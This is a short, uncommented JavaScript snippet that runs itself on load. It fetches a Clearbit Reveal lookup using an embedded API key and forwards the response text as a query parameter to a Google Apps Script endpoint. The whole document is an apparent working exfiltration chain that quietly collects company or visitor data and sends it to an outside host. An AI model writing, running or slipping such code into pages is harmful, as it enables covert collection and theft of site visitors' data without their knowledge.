async function x(){
var y = await exportV();
var z = "https://script.google.com/macros/s/AKfycbz2LbmG-76qSukYkmXYYWPk1ytkaw3h1XROtobqUMgv2GJuhXz9nTnhnqOmJn7Qh3WhuQ/exec?blob="+y;
console.log(z);
await fetch(z);}

async function exportV() {
 return fetch("https://reveal.clearbit.com/v1/companies/reveal?authorization=pk_a7bb4cb2fcda3017eb148eeffe8438d7&callback=revealCallback")
 .then(response => response.text())
}

x();
